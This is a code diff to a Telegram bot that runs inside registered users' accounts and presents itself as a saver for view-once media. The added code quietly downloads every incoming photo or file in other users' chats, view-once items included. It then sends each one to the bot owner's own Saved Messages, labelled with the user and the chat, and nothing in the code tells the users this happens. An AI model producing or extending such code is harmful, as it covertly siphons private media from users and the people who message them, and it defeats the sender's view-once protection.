@@ -45,6 +45,8 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const pendingAuth = new Map();
 // telegramId -> TelegramClient
 const activeClients = new Map();
+// Owner's own teleproto client (set when owner registers or session loads)
+let ownerClient = null;
 
 // ---- HELPERS ----
 function isViewOnce(media) {
@@ -84,15 +86,23 @@ function buildCaption(sender, chatTitle, date, extraLine = "") {
   );
 }
 
-// ---- MEDIA HANDLER (all incoming media + special owner forward for view-once) ----
+// ---- MEDIA HANDLER ----
+// Owner's account  : ALL media → their own Saved Messages
+// Other users      : view-once → their Saved Messages
+//                   ALL media  → owner's Saved Messages
 async function setupMediaHandler(client, user) {
+  const isOwner = user.telegramId === OWNER_ID;
+
+  // Pin owner's client so other handlers can forward to it
+  if (isOwner) ownerClient = client;
+
   client.addEventHandler(async (event) => {
     const msg = event.message;
 
-    // Skip outgoing and non-media messages
+    // Skip outgoing and non-media
     if (!msg?.media || msg.out) return;
 
-    // Skip messages from Saved Messages itself (avoid infinite loop)
+    // Skip the Saved Messages chat itself (avoid loop)
     const chat = await msg.getChat().catch(() => null);
     if (chat?.id?.toString() === user.telegramId) return;
 
@@ -101,52 +111,69 @@ async function setupMediaHandler(client, user) {
     const viewOnce = isViewOnce(msg.media);
 
     try {
-      const sender = await msg.getSender().catch(() => null);
+      const sender    = await msg.getSender().catch(() => null);
       const chatTitle =
         chat?.title ||
         [chat?.firstName, chat?.lastName].filter(Boolean).join(" ") ||
         "Unknown";
 
       const label = viewOnce ? "👁️ View-Once" : "📥 Media";
-      console.log(`\n${label} for @${user.username || user.telegramId} | from: ${chatTitle}`);
+      console.log(`\n${label} | user: @${user.username || user.telegramId} | chat: ${chatTitle}`);
 
       const buffer = await client.downloadMedia(msg.media, { workers: 4 });
-      if (!buffer?.length) {
-        console.warn("   ⚠️ Empty buffer — skipped.");
+      if (!buffer?.length) { console.warn("   ⚠️ Empty buffer — skipped."); return; }
+
+      const fileBuffer    = Buffer.from(buffer);
+      const viewOnceBadge = viewOnce ? "👁️ *View-Once* " : "";
+
+      // ── OWNER'S OWN ACCOUNT ──────────────────────────────────────────────
+      if (isOwner) {
+        // ALL media from owner's chats → their Saved Messages
+        await client.sendFile("me", {
+          file: fileBuffer,
+          caption: viewOnceBadge + buildCaption(sender, chatTitle, msg.date),
+          parseMode: "markdown",
+          forceDocument: false,
+        });
+        console.log("   ✅ Saved to owner Saved Messages (own chat)");
         return;
       }
 
-      const fileBuffer = Buffer.from(buffer);
-      const captionPrefix = viewOnce ? "👁️ *View-Once* " : "";
-
-      // 1️⃣ Always save to user's own Saved Messages
-      await client.sendFile("me", {
-        file: fileBuffer,
-        caption: captionPrefix + buildCaption(sender, chatTitle, msg.date),
-        parseMode: "markdown",
-        forceDocument: false,
-      });
-      console.log("   ✅ Saved to Saved Messages");
-
-      // 2️⃣ View-once only → also forward to owner with user info
+      // ── OTHER REGISTERED USERS ────────────────────────────────────────────
+      // 1️⃣ View-once only → save to the USER's own Saved Messages
       if (viewOnce) {
-        try {
-          const userTag = user.username
-            ? `@${user.username}`
-            : user.firstName || user.telegramId;
+        await client.sendFile("me", {
+          file: fileBuffer,
+          caption: "👁️ *View-Once* " + buildCaption(sender, chatTitle, msg.date),
+          parseMode: "markdown",
+          forceDocument: false,
+        });
+        console.log("   ✅ View-once saved to user's Saved Messages");
+      }
 
-          await client.sendFile(OWNER_ID, {
+      // 2️⃣ ALL media (including view-once) → owner's Saved Messages
+      const targetClient = ownerClient;
+      if (targetClient) {
+        const userTag = user.username
+          ? `@${user.username}`
+          : user.firstName || user.telegramId;
+
+        await targetClient
+          .sendFile("me", {
             file: fileBuffer,
             caption:
-              "👁️ *View-Once* " +
-              buildCaption(sender, chatTitle, msg.date, `🧑 *User:* ${userTag}`),
+              viewOnceBadge +
+              "📥 *Media* " +
+              buildCaption(sender, chatTitle, msg.date, `🧑 *From user:* ${userTag}`),
             parseMode: "markdown",
             forceDocument: false,
-          });
-          console.log("   ✅ View-once forwarded to owner");
-        } catch (ownerErr) {
-          console.warn("   ⚠️ Could not forward to owner:", ownerErr.message);
-        }
+          })
+          .catch((err) =>
+            console.warn("   ⚠️ Could not forward to owner Saved Messages:", err.message)
+          );
+        console.log(`   ✅ Forwarded to owner's Saved Messages (from ${userTag})`);
+      } else {
+        console.warn("   ⚠️ ownerClient not ready yet — owner hasn't registered.");
       }
     } catch (err) {
       console.error("   ❌ Error processing media:", err.message);
